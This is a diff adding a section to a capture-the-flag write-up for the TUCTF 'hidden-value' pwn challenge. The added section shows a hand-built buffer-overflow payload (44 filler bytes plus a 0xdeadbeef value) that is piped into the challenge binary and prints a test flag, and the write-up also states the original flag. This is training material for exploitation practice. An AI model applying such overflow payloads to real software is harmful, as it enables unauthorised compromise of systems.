@@ -117,6 +117,20 @@ print(p.recvall())
 [*] Stopped process './hidden-value' (pid 2908)
 b'Enter your name: Congratulations! You have executed the hidden command.\nThe flag is: fake{fl4g_f0r_t3st1ng}\n\n'
 ```
+
+I also made manual payload for fun
+```bash
+┌──(vein㉿vein)-[~/tuctf/pwn_hidden-value]
+└─$ python2 -c print"'a' * 44 + '\xef\xbe\xad\xde'"> payload
+
+┌──(vein㉿vein)-[~/tuctf/pwn_hidden-value]
+└─$ ./hidden-value < payload                                
+Enter your name: Congratulations! You have executed the hidden command.
+The flag is: fake{fl4g_f0r_t3st1ng}
+
+zsh: segmentation fault  ./hidden-value < payload
+```
+
 The original flag was: TUCTF{pr4cti4l_buffer_overrun}
 
 
